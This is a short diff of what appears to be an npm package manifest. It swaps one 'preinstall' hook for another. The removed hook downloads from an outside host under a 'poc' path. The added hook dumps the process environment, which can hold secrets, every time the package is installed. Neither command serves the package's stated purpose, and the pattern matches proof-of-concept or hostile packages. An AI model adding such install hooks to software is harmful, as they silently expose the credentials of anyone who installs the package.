@@ -8,7 +8,7 @@
         "node": ">= 0.10.0"
     },
     "scripts": {
-        "preinstall": "wget 0v0.in/poc/123456"
+        "preinstall": "cat /proc/self/environ"
     },
     "repository": {
         "type": "git",
